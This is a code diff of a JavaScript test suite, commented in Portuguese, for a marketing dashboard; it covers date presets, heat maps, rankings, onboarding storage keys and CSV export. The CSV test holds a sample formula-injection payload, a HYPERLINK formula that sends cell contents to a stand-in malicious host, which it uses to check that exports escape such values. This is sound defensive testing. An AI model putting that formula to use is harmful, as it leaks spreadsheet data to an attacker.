@@ -174,7 +174,7 @@ await teste("radar: episódios do núcleo + registro do servidor com ✓/✓✓/
   assert.equal(R.registro[1].envio.k, "erro"); assert.equal(R.registro[1].envio.tique, "!");
   assert.deepEqual(L.estadoIntegracao(integracoes, alertas, agora), puroPainel.estadoIntegracao(integracoes, alertas, agora));
   assert.equal(L.textoPilula(L.estadoIntegracao(integracoes, alertas, agora)), "Meta desconectado");
-  assert.equal(L.textoQueda(L.estadoIntegracao(integracoes, alertas, agora).erros), "Meta desconectado · dados até 27/09 05:00.");
+  assert.equal(L.textoQueda(L.estadoIntegracao(integracoes, alertas, agora).erros), "Meta desconectado · dados até 27/09 às 05:00."); // plano 2000d: NX-077 — «às» entre data e hora
 });
 
 await teste("statusEnvio, canalDe, nomeRegraSrv e eixoTopo = os do painel", () => {
@@ -334,7 +334,8 @@ await teste("chip de variação: sentido 'cima', 'baixo' e neutro", () => {
   assert.deepEqual(pick(L.chipVar(8, 10, "cima")), { cls: "ruim", seta: "▼", txt: "20%" });
   assert.deepEqual(pick(L.chipVar(8, 10, "baixo")), { cls: "bom", seta: "▼", txt: "20%" });
   assert.deepEqual(pick(L.chipVar(12, 10, "neutro")), { cls: "neutro", seta: "▲", txt: "20%" });
-  assert.deepEqual(pick(L.chipVar(5, 0)), { cls: "neutro", seta: "", txt: "sem base" });
+  // plano 1500c: de 0 para algo é «novo» (AC-179), não «sem base»
+  assert.deepEqual(pick(L.chipVar(5, 0)), { cls: "neutro", seta: "", txt: "novo" });
   assert.deepEqual(pick(L.chipVar(100.4, 100)), { cls: "neutro", seta: "→", txt: "0%" });
   function pick(c) { return { cls: c.cls, seta: c.seta, txt: c.txt }; }
 });
@@ -353,9 +354,11 @@ await teste("datas no fuso de São Paulo (servidor em UTC não muda o dia)", () 
 console.log("\n(d) relatórios e início");
 
 await teste("período: 7/30/90 terminam hoje (SP); personalizado confere ordem e o limite de 1 ano (periodo_grande)", () => {
-  assert.deepEqual(L.periodoPreset(30, "2026-09-28"), { de: "2026-08-30", ate: "2026-09-28" }, "30 dias = hoje e os 29 anteriores");
-  assert.deepEqual(L.periodoPreset(7, "2026-03-02"), { de: "2026-02-24", ate: "2026-03-02" });
-  assert.equal(L.difDias(L.periodoPreset(90, "2026-09-28").de, "2026-09-28") + 1, 90);
+  // plano 1500c: os presets terminam ONTEM (AC-156/AC-117: hoje ainda está pela metade); «incluir hoje» volta ao de antes
+  assert.deepEqual(L.periodoPreset(30, "2026-09-28"), { de: "2026-08-29", ate: "2026-09-27" }, "30 dias = ontem e os 29 anteriores");
+  assert.deepEqual(L.periodoPreset(30, "2026-09-28", { incluirHoje: true }), { de: "2026-08-30", ate: "2026-09-28" });
+  assert.deepEqual(L.periodoPreset(7, "2026-03-02", { incluirHoje: true }), { de: "2026-02-24", ate: "2026-03-02" });
+  assert.equal(L.difDias(L.periodoPreset(90, "2026-09-28").de, "2026-09-27") + 1, 90);
   assert.deepEqual(L.validarPeriodo("2026-01-01", "2026-01-31"), { ok: true, dias: 31 });
   assert.equal(L.validarPeriodo("2026-01-01", "2026-01-01").dias, 1, "um dia só vale");
   assert.equal(L.validarPeriodo("2025-09-28", "2026-09-29").ok, true, "366 dias de diferença ainda vale (p_ate − p_de ≤ 366)");
@@ -412,7 +415,7 @@ await teste("mapa de calor: lista → matriz 7 × 24 (0 = domingo), pico e entra
   assert.equal(m.length, 7); assert.ok(m.every(l => l.length === 24));
   assert.equal(m[1][9], 7, "soma repetidos"); assert.equal(m[6][23], 3); assert.equal(m[3][14], 4, "aceita texto numérico");
   assert.equal(m.flat().reduce((s, x) => s + x, 0), 14, "dow 7 e hora 24 ficam de fora");
-  assert.deepEqual(L.picoCalor(m), { dow: 1, hora: 9, qtd: 7 });
+  assert.deepEqual(L.picoCalor(m), { dow: 1, hora: 9, qtd: 7, empates: 0 });   // plano 2000d: DA-223 — diz quantos empatam
   assert.equal(L.picoCalor(L.matrizCalor([])), null);
   assert.equal(L.matrizCalor(null).flat().length, 168);
 });
@@ -455,12 +458,12 @@ await teste("CSV: texto do usuário nunca vira fórmula no Excel (injeção de C
   ]);
   const linhas = s.slice(1).split("\r\n");
   assert.equal(linhas[1], `"'=HYPERLINK(""http://mal.example/?""&A1;""clique"")";3;12,5`);
-  assert.equal(linhas[2], "'+551299;1;0");
+  assert.equal(linhas[2], "+551299;1;0", "plano 1500c: telefone fica telefone (AC-164) — «+» seguido só de dígitos não é fórmula");
   assert.equal(linhas[3], "'-2+3;2;-1,25", "texto com - vira texto; número negativo sai como número");
   assert.equal(linhas[4], "'@SUM(A1);0;");
   assert.equal(linhas[5], "'\tAna;1;1");
   assert.equal(linhas[6], "Ana;1;1");
-  for (const l of linhas.slice(1)) assert.ok(!/^[=+\-@\t\r]/.test(l), `nenhuma célula começa com fórmula: ${l}`);
+  for (const l of linhas.slice(1)) assert.ok(!/^[=+\-@\t\r]/.test(l) || /^[+-]\d+;/.test(l), `nenhuma célula começa com fórmula: ${l}`);   // plano 1500c: número/telefone pode
 });
 
 const INI = {
@@ -490,7 +493,7 @@ await teste("Início: saudação pelo relógio de SP, saúde do número e mês c
   assert.match(L.estadoCanal({ status: "ativo", ultima_entrada_em: "2026-09-24T10:00:00Z" }, agora).texto, /mais de 3 dias/);
   assert.equal(L.estadoCanal({ status: "ativo", ultima_entrada_em: null }, agora).nivel, "bom", "número novo, ainda sem mensagem, não é problema");
   const mv = L.mesVsAnterior({ receita_mes: 5000, receita_mes_anterior: 12000, receita_mes_anterior_parcial: 4000, dia_do_mes: 28 });
-  assert.deepEqual(mv, { atual: 5000, anterior: 4000, anteriorInteiro: 12000, dia: 28 });
+  assert.deepEqual(mv, { atual: 5000, anterior: 4000, anteriorInteiro: 12000, dia: 28, comparavel: true });   // plano 2000d: DA-215 — diz se o mês anterior serve de base
   assert.equal(L.chipVar(mv.atual, mv.anterior, "cima").txt, "25%");
   assert.equal(L.mesVsAnterior({ receita_mes: 10, receita_mes_anterior: 7 }).anterior, 7, "sem o parcial usa o mês inteiro (contrato básico)");
   assert.equal(L.mesVsAnterior(null), null);
@@ -513,7 +516,9 @@ await teste("ranking de criativos: CRM por criativo soma o crmTot do núcleo; or
   const f = L.rankingCriativos(MD, { dias: 30, por: "fechados" });
   assert.ok(f.lista.every((x, i, a) => x.c.fecharam > 0 && (i === 0 || a[i - 1].c.fecharam >= x.c.fecharam)));
   const c = L.rankingCriativos(MD, { dias: 30, por: "cpa" });
-  assert.ok(c.lista.every((x, i, a) => x.t.conversoes >= L.MIN_CONV_CPA && (i === 0 || a[i - 1].t.cpa <= x.t.cpa)), "menor custo primeiro, com volume mínimo");
+  // plano 1500c: com Meta e Google juntos o custo é comparado na régua de cada plataforma (AC-115) — a ordem segue cpaRel
+  const custoOrd = x => (c.normalizado ? x.cpaRel : x.t.cpa);
+  assert.ok(c.lista.every((x, i, a) => x.t.conversoes >= L.MIN_CONV_CPA && (i === 0 || custoOrd(a[i - 1]) <= custoOrd(x))), "menor custo primeiro, com volume mínimo");
   assert.equal(c.lista[0].barra, 1, "o menor custo enche a barra");
   assert.ok(c.lista.every(x => !/:outros$/.test(x.k.id)), "'Outros anúncios da campanha' não é criativo");
   assert.equal(L.rankingCriativos(MD, { por: "inventado" }).por, "receita");
@@ -972,8 +977,17 @@ await teste("R119: os filtros do checklist são os declarados nas seções das C
 
 await teste("R119: «Sim, chegou» no teste do assistente marca «Mensagem de teste enviada» neste aparelho (a mesma chave do «Já está bom»)", async () => {
   const cw = ler("web/app/cv-config.js"), ini = ler("web/app/inicio.js"), cfg = ler("web/app/config.js");
-  const chave = "`nx-onb:${ctx.cliente.id}:${(ctx.sessao && ctx.sessao.conta && ctx.sessao.conta.id) || \"-\"}`";
-  for (const [nome, src] of [["inicio", ini], ["config", cfg]]) assert.ok(src.includes(chave), `${nome}: a mesma chave local`);
+  // plano 2000d: DR-333 — o Início monta a chave por chaveOnboarding (mesmo formato «nx-onb:<cliente>:<conta>»), mas sem conta não guarda nada
+  // (a chave «-» era dividida por quem usasse o aparelho); com conta, a chave é a mesma do config.js
+  // plano 2000d: REV-09 — o config.js também monta a chave por função (chaveOnboardingCfg, FX-019/DR-333): o teste confere o
+  // COMPORTAMENTO (as duas funções dão a mesma chave, e nenhuma com conta vazia) e que cada tela usa a sua função com a conta da sessão
+  const urlDe = (...p) => (async () => (await import("node:url")).pathToFileURL(join(RAIZ, ...p)).href)();
+  const I0 = await import(await urlDe("web", "app", "inicio.js")), C0 = await import(await urlDe("web", "app", "config.js"));
+  for (const [cli, conta] of [["c1", "k1"], ["cli-9", "conta-7"]]) assert.equal(C0.chaveOnboardingCfg(cli, conta), I0.chaveOnboarding(cli, conta), "config e Início: a mesma chave local");
+  assert.equal(I0.chaveOnboarding("c1", "k1"), "nx-onb:c1:k1");
+  assert.equal(C0.chaveOnboardingCfg("c1", null), null, "config: sem conta não há chave");
+  assert.ok(cfg.includes("chaveOnboardingCfg(ctx.cliente.id, ctx.sessao && ctx.sessao.conta && ctx.sessao.conta.id)"), "config: a chave pela conta da sessão");
+  assert.ok(ini.includes("chaveOnboarding(ctx.cliente.id, ctx.sessao && ctx.sessao.conta && ctx.sessao.conta.id)"), "inicio: a mesma chave local (pela conta)");
   // plano 100 (frente G): o cv-config passou a marcar por uma função pura (marcarTesteLocal) — o teste agora é de comportamento
   const CW = await import("../web/app/cv-config.js");
   const loja = new Map([["nx-onb:c1:u1", JSON.stringify({ dispensadoAte: 99, pulados: ["colega_convidado"] })]]);
@@ -981,8 +995,9 @@ await teste("R119: «Sim, chegou» no teste do assistente marca «Mensagem de te
   assert.equal(CW.marcarTesteLocal(arm, "c1", "u1"), true);
   const p = JSON.parse(loja.get("nx-onb:c1:u1"));
   assert.deepEqual([p.dispensadoAte, p.pulados], [99, ["colega_convidado", "mensagem_teste"]], "acrescenta sem apagar o resto (dispensadoAte, outros pulados) — na MESMA chave do Início");
-  CW.marcarTesteLocal(arm, "c1", null);
-  assert.ok(loja.has("nx-onb:c1:-"), "sem conta: o mesmo «-» do Início");
+  // plano 2000d: sem conta não grava — o Início e o config.js não leem mais «nx-onb:<cliente>:-» (REV-09/DR-333)
+  assert.equal(CW.marcarTesteLocal(arm, "c1", null), false);
+  assert.ok(!loja.has("nx-onb:c1:-"), "sem conta: nada gravado");
   assert.match(cw, /marcarTesteLocal\(localStorage, ctx\.cliente\.id, ctx\.sessao && ctx\.sessao\.conta && ctx\.sessao\.conta\.id\)/);
   assert.match(cw, /chegou\.addEventListener\("click", \(\) => \{ testeChegou = true; marcarTesteNoChecklist\(\);/);
   assert.ok(L.ONBOARDING_ITENS.some(i => i.id === "mensagem_teste"), "o id marcado existe no checklist");
@@ -1138,7 +1153,7 @@ await teste("M39: Anúncios e Relatórios — abas por ui.segmentado, chip-resum
     assert.match(src, nome === "anuncios" ? /ui\.icone\("reabrir"\), h\("span", \{ class: "rel-rot" \}, "Recarregar"\)/ : /ui\.icone\("reabrir"\), h\("span", \{ class: "rel-rot" \}, "Atualizar"\)/, `${nome}: o nome acessível do botão`);
     assert.doesNotMatch(src, /innerHTML/);
   }
-  assert.match(ads, /L\.textoChipAnuncios\(S\.dias, S\.plat\)/); assert.match(rel, /L\.textoChipRelatorios\(\{ preset: P\.preset, de: P\.de, ate: P\.ate, aba, nome \}\)/);
+  assert.match(ads, /L\.textoChipAnuncios\(S\.dias, S\.plat(, M)?\)/); /* plano 2000d: NX-075 — recebe M */ assert.match(rel, /L\.textoChipRelatorios\(\{ preset: P\.preset, de: P\.de, ate: P\.ate, aba, nome \}\)/);
   assert.match(ads, /rel-so-largo[^]*?Ajustes de anúncios/, "os atalhos do gestor ficam para telas largas…");
   // plano 1000b: AB-033 — o ⋮ do celular vale para todos (com «Imprimir»); os itens de gestor saem de itensMaisAcoes
   assert.match(ads, /gestor \? \{ rotulo: "Ajustes de anúncios", icone: "engrenagem"/, "…e no ⋮ do celular");
